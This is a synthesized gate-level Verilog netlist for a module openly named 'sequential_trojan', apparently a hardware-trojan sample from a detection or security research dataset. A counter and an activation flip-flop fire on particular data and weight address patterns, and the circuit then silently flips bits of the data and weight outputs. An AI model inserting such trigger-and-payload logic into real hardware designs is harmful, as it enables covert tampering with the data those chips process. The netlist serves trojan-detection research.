/////////////////////////////////////////////////////////////
// Created by: Synopsys DC Expert(TM) in wire load mode
// Version   : V-2023.12-SP5
// Date      : Sat Apr 19 21:44:43 2025
/////////////////////////////////////////////////////////////


module sequential_trojan ( clk, rst, data_addr_en, weight_addr_en, data_addr, 
        weight_addr, data_in, weight_in, data_out, weight_out );
  input [31:0] data_addr;
  input [31:0] weight_addr;
  input [7:0] data_in;
  input [7:0] weight_in;
  output [7:0] data_out;
  output [7:0] weight_out;
  input clk, rst, data_addr_en, weight_addr_en;
  wire   trojan_activated, n80, n81, n82, n83, net1639, net1643, net1645,
         net1651, net1653, net1655, net1656, net1657, net1666, net1677,
         net1678, net1679, net1681, net1718, net1719, net1722, net1739,
         net1755, net1798, net1816, net1840, net1848, net1850, net1849,
         net1854, net1858, net1870, net1883, net1910, net1916, net1915,
         net1914, net1922, net1921, net2007, net2016, net2023, net1688,
         net1920, net1689, net1686, net1685, net1684, net2763, net2768,
         net1654, net1641, net1634, net2925, net2992, net2976, net3702,
         net3709, net1674, net1683, net1682, net1675, net1974, net1691,
         net2965, net2964, net2029, net1662, net2989, net2988, net2985,
         net1673, net1698, net1697, net1692, net1660, net1658, net2987,
         net2979, net2978, net1975, net1953, net1912, net1889, net1670,
         net1667, n85, n86, n87, n88, n89, n90, n91, n92, n93, n94, n95, n96,
         n97, n98, n99, n100, n101, n102, n103, n104, n105, n106, n107, n108,
         n109, n110, n111, n112, n113, n114, n115, n116, n117, n118, n119,
         n120, n121, n122, n123, n124, n125, n126, n127, n128, n129, n130,
         n131, n132, n133, n134, n135, n136, n137, n138, n139, n140, n141,
         n142, n143, n144, n145, n146, n147, n148, n149, n150, n151, n152,
         n153, n154, n155, n156, n157, n158, n159, n160, n161, n162, n163,
         n164, n165, n166, n167, n168, n169, n170, n171, n172, n173, n174,
         n175, n176, n177, n178, n179, n180, n181, n182, n183, n184, n185,
         n186, n187, n188, n189, n190, n191, n192, n193, n194, n195, n196,
         n197, n198, n199, n200, n201, n202, n203, n204, n205, n206, n207,
         n208, n209, n210, n211, n212, n213, n214, n215, n216, n217, n218,
         n219, n220, n221, n222, n223, n224, n225, n226, n227, n228, n229,
         n230, n231, n232, n233, n234, n235, n236, n237, n238, n239, n240,
         n241, n242, n243, n244, n245, n246, n247, n248, n249, n250, n251,
         n252, n253, n254, n255, n256, n257, n258, n259, n260, n261, n262,
         n263, n264, n265, n266, n267, n268, n269, n270, n271, n272, n273,
         n274, n275, n276, n277;
  wire   [3:0] trigger_counter;
  assign data_out[1] = data_in[1];
  assign data_out[0] = data_in[0];

  DFFPOSX1 \trigger_counter_reg[3]  ( .D(n83), .CLK(clk), .Q(
        trigger_counter[3]) );
  DFFPOSX1 trojan_activated_reg ( .D(n80), .CLK(clk), .Q(trojan_activated) );
  DFFPOSX1 \trigger_counter_reg[1]  ( .D(n81), .CLK(clk), .Q(
        trigger_counter[1]) );
  DFFPOSX1 \trigger_counter_reg[2]  ( .D(n82), .CLK(clk), .Q(
        trigger_counter[2]) );
  DFFPOSX1 \trigger_counter_reg[0]  ( .D(net1910), .CLK(clk), .Q(
        trigger_counter[0]) );
  INVX1 U82 ( .A(n143), .Y(n85) );
  INVX1 U83 ( .A(n143), .Y(net1798) );
  INVX1 U84 ( .A(n113), .Y(n86) );
  AND2X2 U85 ( .A(net1673), .B(n125), .Y(n87) );
  INVX1 U86 ( .A(n87), .Y(net1975) );
  AND2X2 U87 ( .A(n205), .B(n206), .Y(net1718) );
  AND2X2 U88 ( .A(n212), .B(n93), .Y(n151) );
  NAND3X1 U89 ( .A(n178), .B(data_in[4]), .C(net1641), .Y(n88) );
  OAI21X1 U90 ( .A(n143), .B(n262), .C(n272), .Y(n89) );
  AND2X1 U91 ( .A(data_addr[1]), .B(net2988), .Y(n90) );
  INVX1 U92 ( .A(n90), .Y(net2989) );
  NOR3X1 U93 ( .A(weight_addr[16]), .B(weight_addr[17]), .C(n91), .Y(n93) );
  INVX1 U94 ( .A(n209), .Y(n91) );
  OR2X1 U95 ( .A(weight_addr[13]), .B(weight_addr[11]), .Y(n92) );
  INVX1 U96 ( .A(n92), .Y(n148) );
  NAND3X1 U97 ( .A(net1673), .B(n127), .C(n182), .Y(net2029) );
  OR2X2 U98 ( .A(data_addr[14]), .B(data_addr[13]), .Y(n105) );
  AND2X1 U99 ( .A(n243), .B(n94), .Y(n205) );
  INVX1 U100 ( .A(n238), .Y(n94) );
  AND2X1 U101 ( .A(trigger_counter[0]), .B(n95), .Y(net1889) );
  INVX1 U102 ( .A(trigger_counter[3]), .Y(n95) );
  AND2X2 U103 ( .A(n96), .B(weight_addr[3]), .Y(n152) );
  INVX1 U104 ( .A(weight_addr[1]), .Y(n96) );
  OR2X2 U105 ( .A(weight_addr[21]), .B(weight_addr[20]), .Y(n106) );
  AND2X2 U106 ( .A(data_addr[1]), .B(net2976), .Y(n138) );
  NAND3X1 U107 ( .A(n224), .B(n223), .C(n227), .Y(n97) );
  INVX1 U108 ( .A(n97), .Y(n228) );
  OR2X2 U109 ( .A(n181), .B(net2023), .Y(n98) );
  INVX1 U110 ( .A(n98), .Y(n178) );
  AOI21X1 U111 ( .A(n99), .B(n100), .C(net1953), .Y(net1974) );
  INVX1 U112 ( .A(trigger_counter[1]), .Y(n99) );
  INVX1 U113 ( .A(trigger_counter[2]), .Y(n100) );
  OR2X2 U114 ( .A(weight_addr[14]), .B(weight_addr[13]), .Y(n103) );
  NOR3X1 U115 ( .A(weight_addr[25]), .B(weight_addr[24]), .C(n119), .Y(n121)
         );
  NAND3X1 U116 ( .A(data_addr[9]), .B(data_addr[10]), .C(n249), .Y(n101) );
  INVX1 U117 ( .A(n101), .Y(n149) );
  NAND3X1 U118 ( .A(net1719), .B(weight_in[5]), .C(weight_in[2]), .Y(n273) );
  OR2X2 U119 ( .A(n142), .B(n102), .Y(n150) );
  INVX1 U120 ( .A(net1655), .Y(n102) );
  NOR3X1 U121 ( .A(weight_addr[2]), .B(weight_addr[11]), .C(n103), .Y(n215) );
  NOR3X1 U122 ( .A(n104), .B(n105), .C(n135), .Y(n155) );
  INVX1 U123 ( .A(n245), .Y(n104) );
  NOR3X1 U124 ( .A(n106), .B(weight_addr[10]), .C(weight_addr[6]), .Y(n213) );
  NOR3X1 U125 ( .A(weight_addr[27]), .B(weight_addr[26]), .C(n107), .Y(n108)
         );
  INVX1 U126 ( .A(weight_addr[7]), .Y(n107) );
  INVX1 U127 ( .A(n108), .Y(n137) );
  NAND3X1 U128 ( .A(weight_addr[0]), .B(weight_addr[3]), .C(n236), .Y(n237) );
  NAND3X1 U129 ( .A(n230), .B(n229), .C(n233), .Y(n109) );
  INVX1 U130 ( .A(n109), .Y(n234) );
  AND2X1 U131 ( .A(data_addr[1]), .B(net2964), .Y(n110) );
  INVX1 U132 ( .A(n110), .Y(net2965) );
  XOR2X1 U133 ( .A(n89), .B(weight_in[6]), .Y(weight_out[6]) );
  XOR2X1 U134 ( .A(n277), .B(data_in[3]), .Y(data_out[3]) );
  OAI21X1 U135 ( .A(trigger_counter[1]), .B(trigger_counter[2]), .C(
        trigger_counter[3]), .Y(net1653) );
  AND2X1 U136 ( .A(n112), .B(data_in[4]), .Y(net1755) );
  INVX1 U137 ( .A(weight_in[3]), .Y(n117) );
  INVX1 U138 ( .A(data_in[4]), .Y(n114) );
  AND2X2 U139 ( .A(n202), .B(n203), .Y(n111) );
  AND2X2 U140 ( .A(data_in[3]), .B(data_in[2]), .Y(n112) );
  AND2X2 U141 ( .A(n122), .B(n116), .Y(n113) );
  XOR2X1 U142 ( .A(n264), .B(n114), .Y(data_out[4]) );
  INVX1 U143 ( .A(n118), .Y(n115) );
  XNOR2X1 U144 ( .A(n168), .B(data_in[6]), .Y(net1848) );
  XOR2X1 U145 ( .A(n265), .B(weight_in[1]), .Y(weight_out[1]) );
  AND2X2 U146 ( .A(n122), .B(n116), .Y(n251) );
  AND2X2 U147 ( .A(n175), .B(n123), .Y(n116) );
  XOR2X1 U148 ( .A(n259), .B(n117), .Y(weight_out[3]) );
  INVX1 U149 ( .A(n142), .Y(n118) );
  AND2X2 U150 ( .A(n241), .B(n121), .Y(n242) );
  OR2X2 U151 ( .A(weight_addr[31]), .B(weight_addr[30]), .Y(n119) );
  OR2X2 U152 ( .A(weight_addr[31]), .B(weight_addr[30]), .Y(n120) );
  INVX1 U153 ( .A(n145), .Y(n122) );
  NOR3X1 U154 ( .A(n173), .B(n160), .C(net1691), .Y(n123) );
  INVX1 U155 ( .A(net1849), .Y(n124) );
  INVX1 U156 ( .A(n145), .Y(net2925) );
  NOR3X1 U157 ( .A(net2989), .B(net2987), .C(n189), .Y(n125) );
  NOR3X1 U158 ( .A(net1916), .B(net2763), .C(n142), .Y(n126) );
  INVX1 U159 ( .A(n126), .Y(net1656) );
  NOR3X1 U160 ( .A(net2965), .B(n201), .C(n198), .Y(n127) );
  AND2X2 U161 ( .A(n187), .B(n186), .Y(n188) );
  INVX1 U162 ( .A(n188), .Y(n128) );
  AND2X2 U163 ( .A(data_addr[11]), .B(data_addr_en), .Y(n190) );
  INVX1 U164 ( .A(n190), .Y(n129) );
  AND2X2 U165 ( .A(data_addr[3]), .B(data_addr[8]), .Y(net2988) );
  AND2X2 U166 ( .A(n196), .B(n195), .Y(n197) );
  INVX1 U167 ( .A(n197), .Y(n130) );
  AND2X2 U168 ( .A(data_addr[11]), .B(data_addr_en), .Y(n200) );
  INVX1 U169 ( .A(n200), .Y(n131) );
  AND2X2 U170 ( .A(data_addr[3]), .B(data_addr[8]), .Y(net2964) );
  AND2X2 U171 ( .A(n211), .B(n210), .Y(n212) );
  INVX1 U172 ( .A(n215), .Y(n132) );
  AND2X2 U173 ( .A(weight_addr[7]), .B(weight_addr[8]), .Y(n219) );
  INVX1 U174 ( .A(n219), .Y(n133) );
  AND2X2 U175 ( .A(net1739), .B(n176), .Y(n221) );
  INVX1 U176 ( .A(n221), .Y(n134) );
  AND2X2 U177 ( .A(weight_addr_en), .B(weight_addr[9]), .Y(n236) );
  AND2X2 U178 ( .A(n247), .B(n246), .Y(n248) );
  INVX1 U179 ( .A(n248), .Y(n135) );
  AND2X2 U180 ( .A(data_addr[11]), .B(data_addr_en), .Y(n249) );
  AND2X2 U181 ( .A(data_addr[3]), .B(data_addr[8]), .Y(net2976) );
  INVX1 U182 ( .A(net1755), .Y(n136) );
  AND2X2 U183 ( .A(n226), .B(n225), .Y(n227) );
  AND2X2 U184 ( .A(n232), .B(n231), .Y(n233) );
  AND2X2 U185 ( .A(net1816), .B(net1719), .Y(n241) );
  AND2X2 U186 ( .A(n240), .B(n242), .Y(n243) );
  OR2X2 U187 ( .A(n120), .B(n134), .Y(n222) );
  INVX1 U188 ( .A(n222), .Y(n139) );
  OR2X2 U189 ( .A(weight_addr[2]), .B(weight_addr[1]), .Y(n235) );
  INVX1 U190 ( .A(n235), .Y(n140) );
  OR2X2 U191 ( .A(data_addr[6]), .B(data_addr[12]), .Y(net1688) );
  INVX1 U192 ( .A(net1688), .Y(n141) );
  BUFX2 U193 ( .A(net2029), .Y(n142) );
  BUFX2 U194 ( .A(net1849), .Y(n143) );
  NOR3X1 U195 ( .A(data_addr[19]), .B(data_addr[18]), .C(n204), .Y(n144) );
  INVX2 U196 ( .A(n144), .Y(net1691) );
  XNOR2X1 U197 ( .A(net1675), .B(net1670), .Y(net1674) );
  XOR2X1 U198 ( .A(n269), .B(weight_in[4]), .Y(weight_out[4]) );
  BUFX2 U199 ( .A(net2992), .Y(n145) );
  AND2X2 U200 ( .A(trigger_counter[3]), .B(net3709), .Y(net1854) );
  INVX1 U201 ( .A(net1854), .Y(n146) );
  OR2X2 U202 ( .A(net2985), .B(n129), .Y(net2987) );
  OR2X2 U203 ( .A(n199), .B(n131), .Y(n201) );
  OR2X2 U204 ( .A(data_addr[20]), .B(data_addr[21]), .Y(n204) );
  OR2X2 U205 ( .A(n218), .B(n133), .Y(n220) );
  INVX1 U206 ( .A(n220), .Y(n147) );
  OR2X2 U207 ( .A(n185), .B(n128), .Y(n189) );
  OR2X2 U208 ( .A(n194), .B(n130), .Y(n198) );
  OR2X2 U209 ( .A(n216), .B(n132), .Y(n217) );
  INVX1 U210 ( .A(n217), .Y(n153) );
  INVX1 U211 ( .A(n237), .Y(n154) );
  OR2X2 U212 ( .A(data_addr[7]), .B(data_addr[5]), .Y(n276) );
  INVX1 U213 ( .A(n276), .Y(n156) );
  INVX1 U214 ( .A(n251), .Y(n157) );
  AND2X2 U215 ( .A(n124), .B(net1816), .Y(n267) );
  INVX1 U216 ( .A(n267), .Y(n158) );
  INVX1 U217 ( .A(n267), .Y(n159) );
  BUFX2 U218 ( .A(net1692), .Y(n160) );
  AND2X2 U219 ( .A(n163), .B(n158), .Y(n268) );
  INVX1 U220 ( .A(n268), .Y(n161) );
  INVX1 U221 ( .A(n268), .Y(n162) );
  AND2X2 U222 ( .A(net1850), .B(weight_in[2]), .Y(n270) );
  INVX1 U223 ( .A(n270), .Y(n163) );
  INVX1 U224 ( .A(n270), .Y(n164) );
  INVX1 U225 ( .A(net1718), .Y(n165) );
  INVX1 U226 ( .A(net1718), .Y(n166) );
  AND2X2 U227 ( .A(net2925), .B(n116), .Y(n244) );
  INVX1 U228 ( .A(n244), .Y(n167) );
  INVX1 U229 ( .A(n244), .Y(n168) );
  INVX1 U230 ( .A(net1975), .Y(n169) );
  AND2X2 U231 ( .A(n161), .B(weight_in[3]), .Y(n269) );
  OR2X2 U232 ( .A(net1682), .B(net1974), .Y(net1675) );
  BUFX2 U233 ( .A(net1684), .Y(n170) );
  INVX1 U234 ( .A(trigger_counter[1]), .Y(net2763) );
  INVX1 U235 ( .A(n261), .Y(n171) );
  INVX1 U236 ( .A(n171), .Y(n172) );
  INVX1 U237 ( .A(n111), .Y(n173) );
  OR2X2 U238 ( .A(n256), .B(n181), .Y(n264) );
  INVX1 U239 ( .A(net1651), .Y(net2023) );
  INVX1 U240 ( .A(n257), .Y(n174) );
  INVX1 U241 ( .A(n174), .Y(n175) );
  OR2X2 U242 ( .A(n165), .B(n263), .Y(n272) );
  NOR2X1 U243 ( .A(weight_addr[25]), .B(weight_addr[24]), .Y(n176) );
  INVX1 U244 ( .A(net1719), .Y(n177) );
  INVX1 U245 ( .A(net1685), .Y(n179) );
  INVX1 U246 ( .A(n179), .Y(n180) );
  INVX1 U247 ( .A(n112), .Y(n181) );
  NOR3X1 U248 ( .A(net1683), .B(n180), .C(n170), .Y(n182) );
  NOR2X1 U249 ( .A(rst), .B(n183), .Y(n184) );
  INVX1 U250 ( .A(net1667), .Y(n183) );
  INVX1 U251 ( .A(n184), .Y(net1660) );
  NAND3X1 U252 ( .A(net1912), .B(net1889), .C(n169), .Y(net1667) );
  INVX1 U253 ( .A(trigger_counter[0]), .Y(net1670) );
  INVX1 U254 ( .A(net1670), .Y(net2016) );
  INVX1 U255 ( .A(trigger_counter[3]), .Y(net1953) );
  BUFX2 U256 ( .A(net1920), .Y(net1912) );
  AND2X2 U257 ( .A(n87), .B(trojan_activated), .Y(net1641) );
  NOR2X1 U258 ( .A(data_addr[15]), .B(data_addr[16]), .Y(n186) );
  NOR2X1 U259 ( .A(data_addr[17]), .B(data_addr[0]), .Y(n187) );
  NAND2X1 U260 ( .A(net2979), .B(net2978), .Y(n185) );
  NOR2X1 U261 ( .A(data_addr[14]), .B(data_addr[13]), .Y(net2978) );
  NOR2X1 U262 ( .A(data_addr[2]), .B(data_addr[4]), .Y(net2979) );
  AOI22X1 U263 ( .A(net2007), .B(net1660), .C(net1662), .D(n150), .Y(n81) );
  INVX1 U264 ( .A(rst), .Y(net1658) );
  AND2X2 U265 ( .A(trigger_counter[0]), .B(net1658), .Y(net1666) );
  AND2X2 U266 ( .A(trigger_counter[3]), .B(net1658), .Y(net1657) );
  NAND3X1 U267 ( .A(net1697), .B(n191), .C(net1698), .Y(net1692) );
  NOR3X1 U268 ( .A(n173), .B(net1691), .C(n160), .Y(net1673) );
  NOR3X1 U269 ( .A(data_addr[31]), .B(data_addr[29]), .C(data_addr[30]), .Y(
        net1698) );
  NOR3X1 U270 ( .A(data_addr[26]), .B(data_addr[27]), .C(data_addr[28]), .Y(
        n191) );
  INVX1 U271 ( .A(data_addr[25]), .Y(net1697) );
  NAND2X1 U272 ( .A(data_addr[9]), .B(data_addr[10]), .Y(net2985) );
  NAND3X1 U273 ( .A(net2016), .B(net3702), .C(n118), .Y(net1679) );
  NAND3X1 U274 ( .A(net1920), .B(n127), .C(net1673), .Y(net1682) );
  NOR2X1 U275 ( .A(data_addr[15]), .B(data_addr[16]), .Y(n195) );
  NOR2X1 U276 ( .A(data_addr[17]), .B(data_addr[0]), .Y(n196) );
  NAND2X1 U277 ( .A(n193), .B(n192), .Y(n194) );
  NOR2X1 U278 ( .A(data_addr[14]), .B(data_addr[13]), .Y(n192) );
  NOR2X1 U279 ( .A(data_addr[2]), .B(data_addr[4]), .Y(n193) );
  NAND2X1 U280 ( .A(data_addr[9]), .B(data_addr[10]), .Y(n199) );
  INVX1 U281 ( .A(net3709), .Y(net1662) );
  NOR3X1 U282 ( .A(net1858), .B(trigger_counter[3]), .C(net1662), .Y(net1681)
         );
  INVX1 U283 ( .A(data_addr[24]), .Y(n203) );
  NOR2X1 U284 ( .A(data_addr[22]), .B(data_addr[23]), .Y(n202) );
  OR2X2 U285 ( .A(n208), .B(n207), .Y(net1849) );
  NOR2X1 U286 ( .A(weight_addr[28]), .B(weight_addr[29]), .Y(n209) );
  NOR2X1 U287 ( .A(weight_addr[19]), .B(weight_addr[18]), .Y(n210) );
  NOR2X1 U288 ( .A(weight_addr[23]), .B(weight_addr[22]), .Y(n211) );
  NOR3X1 U289 ( .A(weight_addr[15]), .B(weight_addr[5]), .C(weight_addr[4]), 
        .Y(n214) );
  NAND3X1 U290 ( .A(n214), .B(n213), .C(n151), .Y(n207) );
  NAND3X1 U291 ( .A(weight_addr[9]), .B(weight_addr[0]), .C(n152), .Y(n216) );
  NAND2X1 U292 ( .A(weight_addr[12]), .B(weight_addr_en), .Y(n218) );
  NAND3X1 U293 ( .A(n139), .B(n147), .C(n153), .Y(n208) );
  NOR2X1 U294 ( .A(weight_addr[28]), .B(weight_addr[29]), .Y(n223) );
  NOR2X1 U295 ( .A(weight_addr[17]), .B(weight_addr[16]), .Y(n224) );
  NOR2X1 U296 ( .A(weight_addr[19]), .B(weight_addr[18]), .Y(n225) );
  NOR2X1 U297 ( .A(weight_addr[23]), .B(weight_addr[22]), .Y(n226) );
  NOR2X1 U298 ( .A(weight_addr[21]), .B(weight_addr[20]), .Y(n229) );
  NOR2X1 U299 ( .A(weight_addr[10]), .B(weight_addr[6]), .Y(n230) );
  NOR2X1 U300 ( .A(weight_addr[5]), .B(weight_addr[4]), .Y(n231) );
  NOR2X1 U301 ( .A(weight_addr[15]), .B(weight_addr[14]), .Y(n232) );
  AND2X2 U302 ( .A(n234), .B(n228), .Y(n206) );
  NAND3X1 U303 ( .A(n140), .B(n148), .C(n154), .Y(n238) );
  NAND2X1 U304 ( .A(weight_addr[8]), .B(weight_addr[12]), .Y(n239) );
  NOR2X1 U305 ( .A(n239), .B(n137), .Y(n240) );
  NAND2X1 U306 ( .A(net3702), .B(trigger_counter[3]), .Y(net1870) );
  BUFX2 U307 ( .A(trigger_counter[2]), .Y(net3702) );
  INVX1 U308 ( .A(data_addr[7]), .Y(net1683) );
  NOR3X1 U309 ( .A(net1683), .B(n180), .C(n170), .Y(net1920) );
  NOR2X1 U310 ( .A(rst), .B(net1674), .Y(net1910) );
  INVX1 U311 ( .A(net2763), .Y(net3709) );
  INVX1 U312 ( .A(net3702), .Y(net1916) );
  NOR2X1 U313 ( .A(data_addr[2]), .B(data_addr[4]), .Y(n245) );
  NOR2X1 U314 ( .A(data_addr[15]), .B(data_addr[16]), .Y(n246) );
  NOR2X1 U315 ( .A(data_addr[17]), .B(data_addr[0]), .Y(n247) );
  NAND3X1 U316 ( .A(n138), .B(n149), .C(n155), .Y(net2992) );
  OAI21X1 U317 ( .A(net1634), .B(n86), .C(n252), .Y(n250) );
  XOR2X1 U318 ( .A(n250), .B(data_in[7]), .Y(data_out[7]) );
  AOI21X1 U319 ( .A(n258), .B(data_in[6]), .C(n253), .Y(n252) );
  INVX1 U320 ( .A(n254), .Y(n253) );
  INVX1 U321 ( .A(n255), .Y(n258) );
  INVX1 U322 ( .A(n113), .Y(n255) );
  OAI21X1 U323 ( .A(n255), .B(net1634), .C(n88), .Y(net1639) );
  INVX1 U324 ( .A(n251), .Y(n256) );
  INVX1 U325 ( .A(data_in[5]), .Y(net1634) );
  NOR3X1 U326 ( .A(data_out[0]), .B(data_in[1]), .C(data_in[6]), .Y(net1689)
         );
  NAND3X1 U327 ( .A(n178), .B(data_in[4]), .C(net1641), .Y(n254) );
  OR2X2 U328 ( .A(n167), .B(n136), .Y(net1645) );
  NOR2X1 U329 ( .A(net2023), .B(net1654), .Y(n257) );
  INVX1 U330 ( .A(trojan_activated), .Y(net1654) );
  AOI21X1 U331 ( .A(net1653), .B(net1654), .C(rst), .Y(n80) );
  INVX1 U332 ( .A(n162), .Y(n259) );
  INVX1 U333 ( .A(n143), .Y(net2768) );
  INVX1 U334 ( .A(net2763), .Y(net2007) );
  NOR3X1 U335 ( .A(rst), .B(net1678), .C(net1677), .Y(n82) );
  NAND3X1 U336 ( .A(net1686), .B(n260), .C(data_in[3]), .Y(net1685) );
  AND2X2 U337 ( .A(data_addr[5]), .B(data_in[4]), .Y(n260) );
  INVX1 U338 ( .A(data_in[5]), .Y(net1686) );
  NAND3X1 U339 ( .A(n172), .B(net1689), .C(n141), .Y(net1684) );
  NOR2X1 U340 ( .A(data_in[7]), .B(data_in[2]), .Y(n261) );
  INVX1 U341 ( .A(net1681), .Y(net1915) );
  INVX1 U342 ( .A(net1643), .Y(net1651) );
  INVX1 U343 ( .A(net1921), .Y(net1678) );
  XOR2X1 U344 ( .A(n275), .B(weight_in[7]), .Y(weight_out[7]) );
  NAND3X1 U345 ( .A(net2007), .B(n146), .C(net1922), .Y(net1921) );
  INVX1 U346 ( .A(net1679), .Y(net1922) );
  OAI21X1 U347 ( .A(n115), .B(net1915), .C(net1916), .Y(net1914) );
  INVX1 U348 ( .A(net1914), .Y(net1677) );
  AND2X2 U349 ( .A(net1870), .B(net1666), .Y(net1655) );
  INVX1 U350 ( .A(net1657), .Y(net1883) );
  BUFX2 U351 ( .A(n273), .Y(n262) );
  INVX1 U352 ( .A(net1722), .Y(net1719) );
  AND2X2 U353 ( .A(net2768), .B(weight_in[0]), .Y(n265) );
  AND2X2 U354 ( .A(n274), .B(weight_in[6]), .Y(n275) );
  AND2X2 U355 ( .A(data_in[2]), .B(n251), .Y(n277) );
  INVX1 U356 ( .A(net1666), .Y(net1858) );
  INVX1 U357 ( .A(net1849), .Y(net1850) );
  XOR2X1 U358 ( .A(net1639), .B(net1848), .Y(data_out[6]) );
  INVX1 U359 ( .A(net1655), .Y(net1840) );
  INVX1 U360 ( .A(weight_in[5]), .Y(n263) );
  INVX1 U361 ( .A(n159), .Y(n266) );
  AND2X2 U362 ( .A(weight_in[1]), .B(weight_in[0]), .Y(net1816) );
  NOR2X1 U363 ( .A(weight_addr[27]), .B(weight_addr[26]), .Y(net1739) );
  XOR2X1 U364 ( .A(net1798), .B(weight_in[0]), .Y(weight_out[0]) );
  FAX1 U365 ( .A(weight_in[2]), .B(n266), .C(n85), .YS(weight_out[2]) );
  NAND2X1 U366 ( .A(weight_in[4]), .B(weight_in[3]), .Y(net1722) );
  OAI21X1 U367 ( .A(n177), .B(n164), .C(n166), .Y(n271) );
  XOR2X1 U368 ( .A(n271), .B(weight_in[5]), .Y(weight_out[5]) );
  OAI21X1 U369 ( .A(n143), .B(n262), .C(n272), .Y(n274) );
  OAI21X1 U370 ( .A(net1656), .B(net1840), .C(net1883), .Y(n83) );
  NAND3X1 U371 ( .A(data_addr[6]), .B(data_addr[12]), .C(n156), .Y(net1643) );
  XOR2X1 U372 ( .A(data_in[2]), .B(n113), .Y(data_out[2]) );
  FAX1 U373 ( .A(data_in[5]), .B(n157), .C(net1645), .YS(data_out[5]) );
endmodule

